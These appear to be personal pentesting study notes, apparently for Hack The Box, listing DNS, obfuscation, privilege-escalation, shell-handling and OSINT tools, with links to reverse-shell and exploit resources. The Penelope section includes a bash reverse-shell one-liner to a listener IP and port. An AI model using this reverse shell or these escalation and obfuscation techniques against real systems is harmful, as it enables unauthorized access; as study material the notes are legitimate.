#cybersecurity #code #tools #links #linux

[[Linux Tools para Personalizar]]
[[Tips Generales]]
[[Payloads]]

---
# Comandos

> [!info]- Dig
> ## Commands
> 
> |Command|Description|
|---|---|
|`dig domain.com`|Performs a default A record lookup for the domain.|
|`dig domain.com A`|Retrieves the IPv4 address (A record) associated with the domain.|
|`dig domain.com AAAA`|Retrieves the IPv6 address (AAAA record) associated with the domain.|
|`dig domain.com MX`|Finds the mail servers (MX records) responsible for the domain.|
|`dig domain.com NS`|Identifies the authoritative name servers for the domain.|
|`dig domain.com TXT`|Retrieves any TXT records associated with the domain.|
|`dig domain.com CNAME`|Retrieves the canonical name (CNAME) record for the domain.|
|`dig domain.com SOA`|Retrieves the start of authority (SOA) record for the domain.|
|`dig @1.1.1.1 domain.com`|Specifies a specific name server to query; in this case 1.1.1.1|
|`dig +trace domain.com`|Shows the full path of DNS resolution.|
|`dig -x 192.168.1.1`|Performs a reverse lookup on the IP address 192.168.1.1 to find the associated host name. You may need to specify a name server.|
|`dig +short domain.com`|Provides a short, concise answer to the query.|
|`dig +noall +answer domain.com`|Displays only the answer section of the query output.|
|`dig domain.com ANY`|Retrieves all available DNS records for the domain (Note: Many DNS servers ignore `ANY` queries to reduce load and prevent abuse, as per [RFC 8482](https://datatracker.ietf.org/doc/html/rfc8482)).|
> ![[Ciberseguridad/HTB Apuntes/Footprinting#Dig]]

> [!info]- Crunch 
> **WordList Generator**

>[!Info]- Endocers y decoders
>![[Ciberseguridad/HTB Apuntes/JavaScript Deobfuscation#Base64]]
>![[Ciberseguridad/HTB Apuntes/JavaScript Deobfuscation#Hex]]
>![[Ciberseguridad/HTB Apuntes/JavaScript Deobfuscation#Caesar/Rot13]]


# Páginas Web

>[!info] Reverse Shells
>These are repositories of reverse shells in Linux, Windows and MacOS.
>- https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
>- https://www.revshells.com/ : Generador de Reverse Shell

> [!info]- Web Certificate Search
>![[Ciberseguridad/HTB Apuntes/Footprinting#[CRT.SH (Certificate Search)](https //crt.sh/)]]

> [!info]- Toolbox (Email Header Analyzer)
> Analizador de cabezeras de correos para verificar si es legítimo o no.
> ## URL
> https://mxtoolbox.com/

>[!info]- JavaScript Obfuscation and Deobfuscation
># Obfuscation
>We can try obfuscating code using the same tool in [JSF](http://www.jsfuck.com/), and then rerunning it. We will notice that the code may take some time to run, which shows how code obfuscation could affect the performance, as previously mentioned.
>>There are many other JavaScript obfuscators, like [JJ Encode](https://utf-8.jp/public/jjencode.html) or [AA Encode](https://utf-8.jp/public/aaencode.html). However, such obfuscators usually make code execution/compilation very slow, so it is not recommended to be used unless for an obvious reason, like bypassing web filters or restrictions.
>## Minifier
>A common way of reducing the readability of a snippet of JavaScript code while keeping it fully functional is JavaScript minification. `Code minification` means having the entire code in a single (often very long) line. `Code minification` is more useful for longer code, as if our code only consisted of a single line, it would not look much different when minified.
>
> **URL:** https://javascript-minifier.com/
> ### Example
>```js
var numero = 10;
console.log(numero);
let numero2 = 12;
let num3 = numero + numero2;
console.log("SUMA: " + num3)
>```
**Output**:
>```js
var numero=10;console.log(numero);let numero2=12,num3=numero+numero2;console.log("SUMA: "+num3);
>```
>## Packing JavaScript code
Now, let us obfuscate our line of code to make it more obscure and difficult to read. First, we will try [BeautifyTools](http://beautifytools.com/javascript-obfuscator.php) to obfuscate our code.
>**URL:** http://beautifytools.com/javascript-obfuscator.php
>### Example
**INPUT:**
>```js
>var numero=10;console.log(numero);let numero2=12,num3=numero+numero2;console.log("SUMA: "+num3);
>```
**Output**:
>```js
eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('5 0=6;2.4(0);9 3=7,1=0+3;2.4("8: "+1);',10,10,'numero|num3|console|numero2|log|var|10|12|SUMA|let'.split('|'),0,{}))
>```
>## Advanced Obfuscation
>**URL**: https://obfuscator.io/legacy-playground
>#### Example
**INPUT:**
>```js
eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('5 0=6;2.4(0);9 3=7,1=0+3;2.4("8: "+1);',10,10,'numero|num3|console|numero2|log|var|10|12|SUMA|let'.split('|'),0,{}))
>```
**Output**:
>```js
var _0x4fccbb=_0xab03;(function(_0x1aed86,_0x4db2cc){var _0x1b63f7=_0xab03,_0x4abc9c=_0x1aed86();while(!![]){try{var _0x4dd182=parseInt(_0x1b63f7(0x1d0))/0x1*(-parseInt(_0x1b63f7(0x1cc))/0x2)+parseInt(_0x1b63f7(0x1d6))/0x3*(-parseInt(_0x1b63f7(0x1d5))/0x4)+-parseInt(_0x1b63f7(0x1d1))/0x5*(-parseInt(_0x1b63f7(0x1d7))/0x6)+parseInt(_0x1b63f7(0x1cf))/0x7*(-parseInt(_0x1b63f7(0x1ca))/0x8)+-parseInt(_0x1b63f7(0x1c6))/0x9+parseInt(_0x1b63f7(0x1d3))/0xa*(-parseInt(_0x1b63f7(0x1d4))/0xb)+-parseInt(_0x1b63f7(0x1d2))/0xc*(-parseInt(_0x1b63f7(0x1cb))/0xd);if(_0x4dd182===_0x4db2cc)break;else _0x4abc9c['push'](_0x4abc9c['shift']());}catch(_0x16a27a){_0x4abc9c['push'](_0x4abc9c['shift']());}}}
...
var _0xb01ac5=_0x2fcf1e[0x0],_0x1441b2=_0x598f67+_0xb01ac5,_0x2d62a3=_0xab03['lMjpRW'][_0x1441b2];return!_0x2d62a3?(_0xab03b3=_0xab03['RastWB'](_0xab03b3),_0xab03['lMjpRW'][_0x1441b2]=_0xab03b3):_0xab03b3=_0x2d62a3,_0xab03b3;}function _0x2fcf(){var _0x505bcd=['mJjJzwHtwu4','C3bSAxq','nsaWpty7mI40kdaPoZKGmZ03lde9mcSZoZiUncGIodOGiISXktS','n2Hgwwnpva','mZe4nJv1rgj4CNO','nvzqwxHrCG','mte3ndC4mZjoCuDHte4','mte2otbWBwzzAxK','ndqXmw1fs2jOsq','mty0Aw1IqwPU','mJaWmtL3v2jsELG','ote4odq2s3z0wgz0','mtC3mJCXmM9owLjqCa','xhCR','CMvWBgfJzq','BNvTzxjVFg51Btn8y29UC29SzxXUDw1LCM8YFgXVz3X2yxj8mtb8mtj8u1vnqxXSzxq','ndmYntyYnffyDKfhAG','mJzls0TjuLC'];_0x2fcf=function(){return _0x505bcd;};return _0x2fcf();}
>```
>![[Ciberseguridad/HTB Apuntes/JavaScript Deobfuscation#Deobfuscation]]
>

## PrivEsc

>[!info]- HackTricks 
>Documenta técnicas de explotación, escalada de privilegios, enumeración de servicios, bypass de defensas, etc., organizadas por tecnología/plataforma. Sirve como referencia rápida durante un pentest
>- https://hacktricks.wiki/en/index.html

>[!info]- linPEAS
>Script de enumeración automática para Linux (existe la contraparte winPEAS para Windows). Escanea el sistema en busca de vectores de escalada de privilegios: permisos mal configurados, cron jobs, binarios SUID explotables, credenciales expuestas, kernel vulnerable, etc. Se corre después de obtener acceso inicial (post-explotación) para ahorrar tiempo identificando el camino más probable hacia root, en lugar de enumerar todo manualmente.
>- https://github.com/peass-ng/PEASS-ng

>[!info]- DirtyCow
>## DirtyCow (CVE-2016-5195)
Repositorio con PoCs de una vulnerabilidad de _race condition_ en el subsistema de memoria del kernel Linux (copy-on-write), que permite escalar privilegios a root desde un usuario sin privilegios. Afecta kernels antiguos (pre-parche 2016).
>- https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs

>[!info]- GTFObins
>https://gtfobins.org/


# Repositorios

> [!info]- Penelope
> ## Penelope
Penelope es un potente controlador de shell creado como un reemplazo moderno de netcat para la explotación de RCE, con el objetivo de simplificar, acelerar y optimizar los flujos de trabajo posteriores a la explotación.
>- Repositorio: https://github.com/brightio/penelope
>
>```shell
>bash -c 'exec bash >& /dev/tcp/10.10.2.6/4445 0>&1 &' # Principal
>```
>#### Modo de Uso
>Otras opciones para uso más específico
>```bash
penelope  # Listening for reverse shells on 0.0.0.0:4444
>penelope -a   # Listening for reverse shells on 0.0.0.0:4444 and show reverse shell payloads based on the current Listeners
>penelope -p 5555   # Listening for reverse shells on 0.0.0.0:5555
>penelope -i eth0 -p 5555  # Listening for reverse shells on eth0:5555
>penelope -c target -p 3333  # Connect to a bind shell on target:3333
>penelope ssh user@target  # Get a reverse shell from target on local port 4444
>penelope -p 5555 ssh user@target  # Get a reverse shell from target on local port 5555
>penelope -i eth0 -p 5555 -- ssh -l user -p 2222 target  # Get a reverse shell from target on eth0, local port 5555 (use -- if ssh needs switches)
penelope -s <File/Folder>  # Share a file or folder via HTTP
>```
>## Penelope
Penelope es un potente controlador de shell creado como un reemplazo moderno de netcat para la explotación de RCE, con el objetivo de simplificar, acelerar y optimizar los flujos de trabajo posteriores a la explotación.
>- Repositorio: https://github.com/brightio/penelope
>
>```shell
>bash -c 'exec bash >& /dev/tcp/10.10.2.6/4445 0>&1 &' # Principal
>```
>## Modo de Uso
Otras opciones para uso más específico
>```bash
>penelope  # Listening for reverse shells on 0.0.0.0:4444
>>penelope -a   # Listening for reverse shells on 0.0.0.0:4444 and show reverse shell payloads based on the current Listeners
>penelope -p 5555   # Listening for reverse shells on 0.0.0.0:5555
>penelope -i eth0 -p 5555  # Listening for reverse shells on eth0:5555
>penelope -c target -p 3333  # Connect to a bind shell on target:3333
>penelope ssh user@target  # Get a reverse shell from target on local port 4444
>penelope -p 5555 ssh user@target  # Get a reverse shell from target on local port 5555
>penelope -i eth0 -p 5555 -- ssh -l user -p 2222 target  # Get a reverse shell from target on eth0, local port 5555 (use -- if ssh needs switches)
penelope -s <File/Folder>  # Share a file or folder via HTTP
>```

> [!info]- Enum4Linux-ng
> It is a tool for enumerating information from Windows and Samba systems. This tool automates many of the queries, but not all, and can return a large amount of information.
> ## Instalación
> ```shell-session
>git clone https://github.com/cddmp/enum4linux-ng.git
>pip3 install -r requirements.txt
>```
>## Usage
>```shell-session
enum4linux-ng.py 10.129.14.128 -A
>```

> [!info]- SecLists
> ![[Ciberseguridad/HTB Apuntes/Web Fuzzing#Wordlists]]

>[!Info]- Powershell download cradles
>Extensive list of commands in Powershell cradles yo download or invoke for file tranfers.
>- https://gist.github.com/HarmJ0y/bb48307ffa663256e239
# OSINT

> [!info]- Shodan
> ![[Ciberseguridad/HTB Apuntes/Footprinting#Shodan]]

>[!info]- ReconSpider
>## Information
>This tools extracts important information about a website such as emails, links, comments, etc.
>## Installation
>```shell
>pip3 install scrapy
>wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip
>unzip ReconSpider.zip
>python3 ReconSpider.py http://dev.web1337.inlanefreight.htb:PORT
>```
 




